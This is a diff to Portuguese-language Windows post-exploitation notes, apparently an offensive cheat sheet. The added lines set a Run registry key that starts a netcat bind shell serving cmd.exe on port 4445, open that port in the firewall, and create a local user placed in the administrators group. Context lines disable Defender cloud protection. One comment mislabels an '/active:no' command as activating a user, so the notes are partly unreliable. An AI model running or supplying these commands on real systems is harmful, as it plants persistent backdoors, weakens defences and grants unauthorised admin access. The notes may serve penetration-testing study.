@@ -15,4 +15,25 @@ Enable-NetFirewallRule -DisplayGroup "Área de Trabalho Remota" //ADD firewall r
 
 Set-MpPreference -MAPSReporting 0 ​//Disable cloud-based protection.
 
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe' //Adiciona uma regra para o nc abrir a porta 4445.
+
+netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445 //Adiciona uma regra de firewall para liberar a porta 4445 para o nc.
+
+netsh firewall show portopening //Lista as portas liberadas pelo firewall.
+
 netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow //Cria uma regra de firewall para a porta 3389 RDP
+
+## Criar usuário
+
+net user Administrator //Mostra as informações desse usuário.
+
+net user usuario senha /add //Adiciona um usuário com senha.
+
+net user usuario /active:no //Ativa o usuario.
+net user usuario /active:no //Desativa o usuario.
+
+net localgroup //Lista grupos locais.
+
+net localgroup Administradores usuario /add //Adicionando o usuario no grupo dos admins.
+
+
